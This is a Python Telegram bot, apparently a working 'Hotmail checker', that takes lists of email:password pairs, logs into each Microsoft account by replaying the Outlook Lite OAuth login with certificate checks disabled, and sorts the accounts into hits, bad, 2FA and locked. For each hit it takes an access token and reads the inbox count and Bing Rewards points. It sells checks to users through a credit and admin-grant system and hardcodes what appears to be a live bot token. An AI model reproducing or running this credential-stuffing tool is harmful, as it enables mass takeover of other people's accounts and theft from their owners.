#!/usr/bin/env python3
"""
Simple Hotmail Checker Bot - NO FANCY STUFF, JUST WORKS
"""

import sys
import subprocess

print("Installing dependencies...")
try:
    subprocess.run([sys.executable, "-m", "pip", "install", "-q", 
                   "python-telegram-bot==20.7", "requests"], 
                   capture_output=True)
except:
    pass

import re
import json
import uuid
import sqlite3
import logging
import asyncio
from datetime import datetime
from typing import Dict, Optional

import requests
import urllib3
urllib3.disable_warnings()

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Config
BOT_TOKEN = "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak"
ADMIN_ID = 5944410248
DB_FILE = "bot.db"

# Database
class DB:
    def __init__(self):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            has_access INTEGER DEFAULT 0,
            credits INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0,
            total_hits INTEGER DEFAULT 0,
            joined_date TEXT,
            is_banned INTEGER DEFAULT 0
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            email TEXT,
            status TEXT,
            inbox_count INTEGER,
            rewards_points INTEGER,
            date TEXT
        )''')
        conn.commit()
        conn.close()
    
    def add_user(self, uid, uname, fname):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date) VALUES (?, ?, ?, ?)',
                 (uid, uname or "", fname or "", datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    def has_access(self, uid):
        if uid == ADMIN_ID:
            return True
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('SELECT has_access FROM users WHERE user_id = ?', (uid,))
        r = c.fetchone()
        conn.close()
        return r and r[0] == 1
    
    def is_banned(self, uid):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,))
        r = c.fetchone()
        conn.close()
        return r and r[0] == 1
    
    def grant(self, uid, creds=10):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO users 
            (user_id, username, first_name, has_access, credits, joined_date, total_checks, total_hits, is_banned)
            VALUES (?, ?, ?, 1, ?, COALESCE((SELECT joined_date FROM users WHERE user_id = ?), ?),
                    COALESCE((SELECT total_checks FROM users WHERE user_id = ?), 0),
                    COALESCE((SELECT total_hits FROM users WHERE user_id = ?), 0), 0)''',
                 (uid, f"user_{uid}", f"User{uid}", creds, uid, datetime.now().isoformat(), uid, uid))
        conn.commit()
        conn.close()
    
    def revoke(self, uid):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('UPDATE users SET has_access = 0 WHERE user_id = ?', (uid,))
        conn.commit()
        conn.close()
    
    def get_credits(self, uid):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('SELECT credits FROM users WHERE user_id = ?', (uid,))
        r = c.fetchone()
        conn.close()
        return r[0] if r else 0
    
    def add_credits(self, uid, amt):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amt, uid))
        conn.commit()
        conn.close()
    
    def use_credit(self, uid):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('UPDATE users SET credits = credits - 1 WHERE user_id = ?', (uid,))
        conn.commit()
        conn.close()
    
    def save_result(self, uid, email, status, inbox, points):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('INSERT INTO results (user_id, email, status, inbox_count, rewards_points, date) VALUES (?, ?, ?, ?, ?, ?)',
                 (uid, email, status, inbox, points, datetime.now().isoformat()))
        if status == 'hit':
            c.execute('UPDATE users SET total_checks = total_checks + 1, total_hits = total_hits + 1 WHERE user_id = ?', (uid,))
        else:
            c.execute('UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
        conn.commit()
        conn.close()
    
    def get_users(self):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('SELECT user_id, username, first_name, has_access, credits, total_checks FROM users LIMIT 20')
        r = c.fetchall()
        conn.close()
        return r
    
    def get_stats(self):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM users')
        total = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM users WHERE has_access = 1')
        active = c.fetchone()[0]
        c.execute('SELECT SUM(total_checks) FROM users')
        checks = c.fetchone()[0] or 0
        c.execute('SELECT SUM(total_hits) FROM users')
        hits = c.fetchone()[0] or 0
        conn.close()
        return {'total': total, 'active': active, 'checks': checks, 'hits': hits}
    
    def user_stats(self, uid):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('SELECT total_checks, total_hits FROM users WHERE user_id = ?', (uid,))
        r = c.fetchone()
        conn.close()
        return {'checks': r[0], 'hits': r[1]} if r else {'checks': 0, 'hits': 0}

# Checker using hit.py flow
class Checker:
    def __init__(self):
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        self.uuid = str(uuid.uuid4())
    
    def check(self, email, pwd):
        r = {'email': email, 'status': 'error', 'inbox': 0, 'points': 0}
        
        try:
            # Step 1: IDP check
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            h1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive"
            }
            
            r1 = self.s.get(url1, headers=h1, timeout=15)
            
            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
                r['status'] = 'bad'
                return r
            
            # Step 2: OAuth
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            h2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9"
            }
            
            r2 = self.s.get(url2, headers=h2, allow_redirects=True, timeout=15)
            
            # Step 3: Extract
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                return r
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            # Step 4: Login
            data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={pwd}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
            h3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            r3 = self.s.post(post_url, data=data, headers=h3, allow_redirects=False, timeout=15)
            
            # Step 5: Check
            txt = r3.text.lower()
            
            if "account or password is incorrect" in txt or r3.text.count("error") > 0:
                r['status'] = 'bad'
                return r
            
            if "identity/confirm" in txt or "consent" in txt:
                r['status'] = '2fa'
                return r
            
            if "abuse" in txt:
                r['status'] = 'locked'
                return r
            
            # Step 6: Get code
            loc = r3.headers.get("Location", "")
            if not loc:
                return r
            
            code_match = re.search(r'code=([^&]+)', loc)
            if not code_match:
                return r
            
            code = code_match.group(1)
            cid = self.s.cookies.get("MSPCID", "")
            if not cid:
                return r
            
            cid = cid.upper()
            
            # Step 7: Token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            r4 = self.s.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                           data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            
            if "access_token" not in r4.text:
                return r
            
            token = r4.json()["access_token"]
            r['status'] = 'hit'
            
            # Step 8: Inbox
            try:
                h5 = {
                    "Host": "outlook.live.com",
                    "content-length": "0",
                    "x-owa-sessionid": str(uuid.uuid4()),
                    "x-req-source": "Mini",
                    "authorization": f"Bearer {token}",
                    "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
                    "action": "StartupData"
                }
                
                r5 = self.s.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0",
                               data="", headers=h5, timeout=20)
                
                if r5.status_code == 200 and '"Inbox":' in r5.text:
                    m = re.search(r'"Inbox":\s*\[\s*{\s*"TotalCount":\s*(\d+)', r5.text)
                    if m:
                        r['inbox'] = int(m.group(1))
            except:
                pass
            
            # Step 9: Rewards
            try:
                h6 = {"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0"}
                r6 = self.s.get("https://rewards.bing.com/api/getuserinfo", headers=h6, timeout=10)
                if r6.status_code == 200:
                    r['points'] = r6.json().get('availablePoints', 0)
            except:
                pass
            
            return r
        
        except Exception as e:
            logger.error(f"Error: {e}")
            return r

# Bot
db = DB()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    db.add_user(u.id, u.username, u.first_name)
    
    if db.is_banned(u.id):
        await update.message.reply_text("You are banned.")
        return
    
    if u.id == ADMIN_ID:
        t = "ADMIN MODE\n\n/admin - Panel\n/check - Check\n/help - Help"
    elif db.has_access(u.id):
        c = db.get_credits(u.id)
        t = f"Credits: {c}\n\n/check - Check\n/credits - View credits\n/help - Help"
    else:
        t = "No access. Contact admin."
    
    await update.message.reply_text(t)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    t = "HELP\n\n/start - Start\n/check - Check accounts\n/credits - View credits\n\nFormat:\nemail:password"
    await update.message.reply_text(t)

async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("Admin only")
        return
    
    s = db.get_stats()
    t = f"ADMIN PANEL\n\nUsers: {s['total']}\nActive: {s['active']}\nChecks: {s['checks']}\nHits: {s['hits']}"
    
    kb = [
        [InlineKeyboardButton("Grant Access", callback_data="grant")],
        [InlineKeyboardButton("Revoke Access", callback_data="revoke")],
        [InlineKeyboardButton("Add Credits", callback_data="creds")],
        [InlineKeyboardButton("View Users", callback_data="users")]
    ]
    
    await update.message.reply_text(t, reply_markup=InlineKeyboardMarkup(kb))

async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    
    if db.is_banned(uid):
        await update.message.reply_text("Banned")
        return
    
    if not db.has_access(uid):
        context.user_data['wait'] = False
        await update.message.reply_text("No access")
        return
    
    if uid != ADMIN_ID and db.get_credits(uid) <= 0:
        context.user_data['wait'] = False
        await update.message.reply_text("No credits")
        return
    
    await update.message.reply_text("Send accounts:\nemail:password")
    context.user_data['wait'] = True

async def credits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    
    if db.is_banned(uid):
        await update.message.reply_text("Banned")
        return
    
    c = db.get_credits(uid)
    s = db.user_stats(uid)
    
    t = f"Credits: {c}\nChecks: {s['checks']}\nHits: {s['hits']}"
    await update.message.reply_text(t)

async def handle_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('wait'):
        return
    
    uid = update.effective_user.id
    
    if db.is_banned(uid) or not db.has_access(uid):
        context.user_data['wait'] = False
        await update.message.reply_text("Access denied")
        return
    
    text = update.message.text
    lines = [l.strip() for l in text.split('\n') if ':' in l]
    
    if not lines:
        context.user_data['wait'] = False
        await update.message.reply_text("Invalid format")
        return
    
    accs = []
    for l in lines:
        try:
            e, p = l.split(':', 1)
            accs.append((e.strip(), p.strip()))
        except:
            continue
    
    if not accs:
        context.user_data['wait'] = False
        await update.message.reply_text("No valid accounts")
        return
    
    if uid != ADMIN_ID:
        c = db.get_credits(uid)
        if c < len(accs):
            context.user_data['wait'] = False
            await update.message.reply_text(f"Need {len(accs)}, have {c}")
            return
    
    context.user_data['wait'] = False
    await update.message.reply_text(f"Checking {len(accs)}...")
    
    hits = 0
    bad = 0
    twofa = 0
    locked = 0
    errors = 0
    
    for i, (e, p) in enumerate(accs, 1):
        await update.message.reply_text(f"{i}/{len(accs)}: {e}")
        
        checker = Checker()
        res = checker.check(e, p)
        
        db.save_result(uid, e, res['status'], res['inbox'], res['points'])
        
        if res['status'] == 'hit':
            hits += 1
            if uid != ADMIN_ID:
                db.use_credit(uid)
            await update.message.reply_text(f"HIT - {e}\nInbox: {res['inbox']}\nPoints: {res['points']}")
        elif res['status'] == '2fa':
            twofa += 1
            await update.message.reply_text(f"2FA - {e}")
        elif res['status'] == 'bad':
            bad += 1
            await update.message.reply_text(f"BAD - {e}")
        elif res['status'] == 'locked':
            locked += 1
            await update.message.reply_text(f"LOCKED - {e}")
        else:
            errors += 1
            await update.message.reply_text(f"ERROR - {e}")
        
        await asyncio.sleep(3)
    
    sum = f"DONE\n\nHits: {hits}\nBad: {bad}\n2FA: {twofa}\nLocked: {locked}\nErrors: {errors}\nTotal: {len(accs)}"
    await update.message.reply_text(sum)

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    if q.from_user.id != ADMIN_ID:
        return
    
    if q.data == "users":
        users = db.get_users()
        t = "USERS (first 20):\n\n"
        for uid, un, fn, acc, cr, ch in users:
            icon = "+" if acc else "-"
            t += f"{icon} {uid} - {fn or 'Unknown'}\n  Credits: {cr} | Checks: {ch}\n\n"
        if len(t) > 4000:
            t = t[:4000] + "\n..."
        await q.message.reply_text(t)
    
    elif q.data == "grant":
        await q.message.reply_text("Send: !grant USER_ID CREDITS\nExample: !grant 123456789 10")
        context.user_data['act'] = 'grant'
    
    elif q.data == "revoke":
        await q.message.reply_text("Send: !revoke USER_ID\nExample: !revoke 123456789")
        context.user_data['act'] = 'revoke'
    
    elif q.data == "creds":
        await q.message.reply_text("Send: !credits USER_ID AMOUNT\nExample: !credits 123456789 5")
        context.user_data['act'] = 'credits'

async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID or not update.message.text.startswith('!'):
        return
    
    txt = update.message.text.strip()
    act = context.user_data.get('act')
    if not act:
        return
    
    try:
        parts = txt.split()
        
        if act == 'grant' and len(parts) >= 2:
            uid = int(parts[1])
            creds = int(parts[2]) if len(parts) > 2 else 10
            db.grant(uid, creds)
            await update.message.reply_text(f"Granted to {uid}")
            context.user_data['act'] = None
        
        elif act == 'revoke' and len(parts) >= 2:
            uid = int(parts[1])
            db.revoke(uid)
            await update.message.reply_text(f"Revoked {uid}")
            context.user_data['act'] = None
        
        elif act == 'credits' and len(parts) >= 3:
            uid = int(parts[1])
            amt = int(parts[2])
            db.add_credits(uid, amt)
            await update.message.reply_text(f"Added {amt} to {uid}")
            context.user_data['act'] = None
    
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

def main():
    print("SIMPLE HOTMAIL CHECKER BOT")
    print(f"Token: {BOT_TOKEN[:20]}...")
    print(f"Admin: {ADMIN_ID}")
    print("Starting...\n")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("admin", admin))
    app.add_handler(CommandHandler("check", check))
    app.add_handler(CommandHandler("credits", credits_cmd))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r'^!'), admin_cmd))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex(r'^!'), handle_accounts))
    
    print("Bot running!\n")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped")
    except Exception as e:
        print(f"\nError: {e}")
        import traceback
        traceback.print_exc()
